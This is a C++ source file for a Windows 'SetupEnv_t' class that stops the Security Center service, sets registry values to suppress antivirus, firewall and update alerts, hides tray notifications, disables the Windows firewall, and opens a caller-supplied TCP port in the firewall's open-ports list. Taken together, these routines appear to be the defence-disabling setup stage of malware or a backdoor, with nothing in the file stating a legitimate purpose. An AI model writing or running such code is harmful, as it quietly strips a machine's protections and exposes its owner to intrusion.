// SetupEnv_t.cpp: implementation of the SetupEnv_t class.
//
//////////////////////////////////////////////////////////////////////
 
#include "SetupEnv_t.h"

//////////////////////////////////////////////////////////////////////
// Construction/Destruction
//////////////////////////////////////////////////////////////////////

SetupEnv_t::SetupEnv_t()
{
	RC = new RegistryManager_t;
}
//=============================================================================
SetupEnv_t::~SetupEnv_t()
{
	delete RC;
}
//=============================================================================
bool SetupEnv_t::StopWinService(const char* SrvName)
{
	SERVICE_STATUS ss;
	SC_HANDLE hSrv,hsc;
	
	
	//Open the Service Control Manager
	hsc = OpenSCManager (NULL,NULL,SC_MANAGER_ALL_ACCESS);
	
	//Check if OpenSCManager returns NULL. Otherwise proceed
	if (hsc != NULL)
	{
		//Open the Service
		hSrv = OpenService(hsc,SrvName,SERVICE_STOP);
		if (hSrv != NULL)
			//Stop the service
			if (ControlService(hSrv,SERVICE_CONTROL_STOP,&ss) != 0)
			{	
				CloseServiceHandle (hSrv);
				CloseServiceHandle(hsc);
				return true;
			}		
			
	}
	CloseServiceHandle (hSrv);
	CloseServiceHandle(hsc);
	return false;
}

//=============================================================================
bool SetupEnv_t::TurnOffSecurityCenter()
{
	SERVICE_STATUS ss;
	SC_HANDLE hSrv;
	
	//Open the Service Control Manager
	SC_HANDLE sc = OpenSCManager (NULL,NULL,SC_MANAGER_ALL_ACCESS);
	
	//Check if OpenSCManager returns NULL. Otherwise proceed
	if (sc != NULL)
	{
		//Open the Service
		hSrv = OpenService(sc,"wscsvc",SERVICE_STOP);
		if (hSrv != NULL)
			//Stop the service
			if (ControlService(hSrv,SERVICE_CONTROL_STOP,&ss))
			{	
				CloseServiceHandle (hSrv);
				CloseServiceHandle(sc);
				return true;
			}		
			
	}
	CloseServiceHandle (hSrv);
	CloseServiceHandle(sc);
	return false;
}
//=============================================================================
void SetupEnv_t::RegKeysSetup(const string Port)
{
	string tmp1 = "";
	string tmp2 = "";
	string securityCenter = "Software\\Microsoft\\Security\ Center";

	//Disable Security Center Alerts 
	RC->AddValueToRegKey(HKEY_LOCAL_MACHINE,
				   securityCenter,
				   REG_DWORD,
				   "AntiVirusDisableNotify",
				   "1");
				   
	
	RC->AddValueToRegKey(HKEY_LOCAL_MACHINE,
				   securityCenter,
				   REG_DWORD,
				   "FirewallDisableNotify",
				   "1");
				   
	
	RC->AddValueToRegKey(HKEY_LOCAL_MACHINE,
				   securityCenter,
				   REG_DWORD,
				   "UpdatesDisableNotify",
				   "1");
				   
	
	//Disable Notification (message) from the windows firewall incase of a change in the sys.
	RC->AddValueToRegKey(HKEY_CURRENT_USER,
				   "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TrayNotify",
				   REG_DWORD,
				   "BalloonTip",
					"\0"); 
	RC->AddValueToRegKey(HKEY_CURRENT_USER,
				   "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced",
				   REG_DWORD,
				   "StartButtonBalloonTip",
					"\0");   	

	RC->AddValueToRegKey(HKEY_CURRENT_USER,
				   "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer",
				   REG_DWORD,
				   "EnableAutoTray",
				    "\0");


	//Stop Windows firewall by disabling it from the registry.
	RC->AddValueToRegKey(HKEY_LOCAL_MACHINE,
				   "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
				   REG_DWORD,
				   "EnableFirewall",
				   "\0");

	//Allow Exception behaviour
	RC->AddValueToRegKey(HKEY_LOCAL_MACHINE,
				   "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
				   REG_DWORD,
				   "DoNotAllowExceptions",
				   "\0");
	
	//Disable firewall notification
	RC->AddValueToRegKey(HKEY_LOCAL_MACHINE,
				   "SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile",
				   REG_DWORD,
				   "DisableNotifications",
				   "\1");

	//Add a port number in the list of ports under firewall,to allow connection
	//ex: [port number:connection type]
	tmp1 = Port;
	tmp1+= ":TCP";
	
	tmp2 = Port;
	tmp2+= ":TCP:127.0.0.1/255.255.255.255";
	
	RC->AddValueToRegKey(HKEY_LOCAL_MACHINE,
		"SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile\\GloballyOpenPorts\\List",
		REG_SZ,
		tmp1,		// example: "1234:TCP",
		tmp2);		//example : "1234:TCP:127.0.0.1/255.255.255.255"
				  

}
//=============================================================================
